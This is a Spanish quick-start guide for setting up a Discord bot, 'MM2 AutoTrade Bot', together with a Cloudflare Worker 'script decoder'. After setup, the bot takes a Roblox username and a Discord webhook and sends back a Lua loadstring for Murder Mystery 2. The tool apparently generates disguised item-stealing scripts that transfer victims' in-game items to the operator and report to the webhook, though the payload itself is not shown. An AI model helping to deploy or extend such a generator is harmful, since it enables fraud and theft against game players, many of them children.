# ⚡ Quick Start - 5 Minutos

## Paso 1: Preparar Discord (2 min)

1. Ve a https://discord.com/developers/applications → **New Application**
2. Nombre: `MM2 AutoTrade Bot`
3. Ve a **Bot** → **Add Bot**
4. Copia el **TOKEN**
5. En **Privileged Gateway Intents**, activa:
   - Message Content Intent
6. Ve a **OAuth2** → **URL Generator**
   - Scope: `bot`
   - Permisos: Send Messages, Use Slash Commands, Send DMs
7. Copia la URL generada y abre en navegador para invitar el bot a tu servidor

**Guardar:** Tu `DISCORD_TOKEN`

---

## Paso 2: Preparar Cloudflare (2 min)

1. Ve a https://dash.cloudflare.com → **Workers & Pages**
2. **Create Application** → **Create Worker**
3. Nombre: `mm2-script-decoder`
4. **Deploy**
5. En el editor, reemplaza TODO con el código de `cloudflare-worker.js`
6. **Save and Deploy**

### Configurar KV:
1. Ve a **Workers** → **KV**
2. **Create a namespace** → Nombre: `SCRIPTS`
3. Regresa al Worker editor
4. **Add Binding**:
   - Name: `SCRIPTS`
   - Type: `KV Namespace`
   - Namespace: `SCRIPTS`
5. **Save and Deploy**

### Agregar Pako:
En la PRIMERA línea del Worker (antes de `export default`):
```javascript
import pako from 'https://cdn.jsdelivr.net/npm/pako@2/dist/pako.es5.min.js';
```
**Save and Deploy**

**Guardar:** Tu URL del Worker: `https://mm2-script-decoder.TU-DOMINIO.workers.dev`

---

## Paso 3: Configurar Proyecto (1 min)

```bash
# Copiar variables
cp .env.example .env

# Editar .env
nano .env
```

Agrega:
```
DISCORD_TOKEN=tu_token_aqui
CLOUDFLARE_WORKER_URL=https://mm2-script-decoder.tu-dominio.workers.dev
```

Guarda: `Ctrl+O` → `Enter` → `Ctrl+X`

---

## Paso 4: Ejecutar

```bash
# Instalar dependencias
npm install

# Ejecutar
npm start
```

Deberías ver:
```
✅ Bot conectado como MM2 AutoTrade#1234
✅ Script MM2 cargado correctamente
✅ Comandos registrados
```

---

## ✅ ¡Listo!

En Discord, escribe:
```
/generate script
```

Selecciona **Murder Mystery 2**, ingresa:
- Username: `tuusuario`
- Webhook: `https://discord.com/api/webhooks/...`

¡Recibirás un DM con tu loadstring! 🎉

---

## 🆘 Si algo falla

### Bot no responde
- Verifica que está en tu servidor
- Comprueba `DISCORD_TOKEN` en `.env`
- Reinicia: `Ctrl+C` → `npm start`

### Worker devuelve error
- Abre: `https://tu-worker.workers.dev/`
- Deberías ver JSON con `"status": "online"`
- Si no, revisa que pako está importado

### Error en DM
- Abre DMs con bots en Discord
- Bot necesita permiso "Send DMs to Users"

---

## 📝 Próximos Pasos

1. **Personaliza el script Lua** - Edita `mm2-script.lua` con tu lógica
2. **Deploy en producción** - Ver `README.md` para Railway, Replit, VPS
3. **Agrega más juegos** - Duplica la lógica de MM2 para otros juegos

---

**¡Disfruta tu bot! 🔪**
